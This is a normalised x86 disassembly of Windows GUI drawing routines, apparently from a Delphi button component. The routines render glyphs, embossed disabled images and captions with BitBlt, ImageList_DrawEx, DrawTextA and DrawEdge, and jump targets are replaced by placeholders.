mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_42c508
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_42c54c
sub_42c61c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42cbcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_412938
mov eax [ ebp - 0xc ]
call sub_422284
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d3f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_421a4c
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_412938
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_42c388
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c314
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_422284
push eax
mov eax [ ebp - 0xc ]
call sub_422284
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d664
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_42c2b8
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_42c2b8
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42cb8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403104
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_422284
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d3f4
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_422340
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_422284
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422284
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d664
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423054
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_422284
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d3f4
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422284
push eax
mov eax [ ebp - 0x14 ]
call sub_422284
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d664
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_41d3f4
mov eax [ ebp - 0x18 ]
call sub_41db3c
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422284
call sub_41db3c
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_422284
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_41d3f4
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422284
push eax
mov eax [ ebp - 0x14 ]
call sub_422284
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d664
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_41d3f4
mov eax [ ebp - 0x18 ]
call sub_41db3c
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422284
call sub_41db3c
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_41c768
push eax
mov eax [ ebp - 0x10 ]
call sub_422284
mov eax [ eax + 0x14 ]
pop edx
call sub_41d3f4
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422284
push eax
mov eax [ ebp - 0x14 ]
call sub_422284
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d664
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d3f4
mov eax [ ebp - 0x18 ]
call sub_41db3c
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422284
call sub_41db3c
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423054
mov eax [ ebp - 0xc ]
call sub_422284
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_41d3f4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_41d798
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_41d3f4
push 0x0
mov eax ebx
call sub_41db3c
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41db3c
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422284
call sub_41db3c
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_41db3c
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_41d3f4
push 0x0
mov eax ebx
call sub_41db3c
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41db3c
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_422284
call sub_41db3c
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_41db3c
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_422284
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_41cc28
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_423054
mov eax [ ebp - 0x14 ]
call sub_422284
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d3f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403104
mov eax [ ebp - 0x14 ]
call sub_403104
retn
sub_42cbf4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_42c61c
mov esi eax
call sub_42f358
call sub_42f438
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41db3c
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_447660
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_41c768
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41db3c
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_447660
push eax
call ImageList_DrawEx
call sub_42f358
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_42f69c
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_447660
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_41db3c
push eax
call sub_42f358
lea ecx [ ebp - 0x14 ]
pop edx
call sub_42f588
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_42cd58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41d510
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404114
push eax
mov eax esi
call sub_404314
push eax
mov eax ebx
call sub_41db3c
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_41cc28
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404114
push eax
mov eax esi
call sub_404314
push eax
mov eax ebx
call sub_41db3c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_41cc28
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404114
push eax
mov eax esi
call sub_404314
push eax
mov eax ebx
call sub_41db3c
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42ce38
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_412910
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412910
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_412910
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412938
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_412910
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_412938
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_404114
push eax
mov eax [ ebp + 0x20 ]
call sub_404314
push eax
mov eax [ ebp - 0x8 ]
call sub_41db3c
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_412910
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_404114
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_412910
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_412910
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_412910
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_42f358
call sub_42f438
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_42d164
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_42ce38
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_42cbf4
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42cd58
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42d1d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439090
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_42d1f8
push ebx
mov ebx eax
mov eax ebx
call sub_446884
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42d244
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_42d274
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_42db24
sub_42d294
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_42dbb0
sub_42d2b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c418
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_42dae4
mov ecx esi
xor edx edx
mov eax ebx
call sub_441cbc
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_43a478
mov edx 0xff00000f
mov eax ebx
call sub_43a4ec
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42d374
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_441d18
mov eax [ esi + 0x16c ]
call sub_403104
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_42d3ac
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_42d7d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_41da5c
call sub_42f358
call sub_42f438
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_412938
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_41db3c
mov edx eax
mov eax esi
call sub_4374a0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41db3c
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41db3c
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_42f358
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_42f75c
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41db3c
push eax
call sub_42f358
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f544
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41db3c
push eax
call sub_42f358
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f4a8
push esi
